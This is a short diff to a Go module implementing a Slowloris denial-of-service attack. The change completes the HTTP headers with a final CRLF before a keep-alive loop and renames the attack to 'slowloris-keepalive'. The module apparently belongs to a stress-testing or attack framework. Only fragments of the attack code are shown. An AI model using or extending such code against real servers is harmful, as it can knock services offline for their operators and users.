@@ -102,6 +102,12 @@ func (s *Slowloris) Execute(ctx context.Context, target Target) error {
 		}
 	}
 
+	// Complete the HTTP request so the server responds before we enter the keep-alive loop.
+	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+	if _, err := conn.Write([]byte("\r\n")); err != nil {
+		return fmt.Errorf("failed to terminate headers: %w", err)
+	}
+
 	ticker := time.NewTicker(s.keepAliveInterval)
 	defer ticker.Stop()
 
@@ -123,7 +129,7 @@ func (s *Slowloris) Execute(ctx context.Context, target Target) error {
 }
 
 func (s *Slowloris) Name() string {
-	return "slowloris"
+	return "slowloris-keepalive"
 }
 
 func (s *Slowloris) ActiveConnections() int64 {
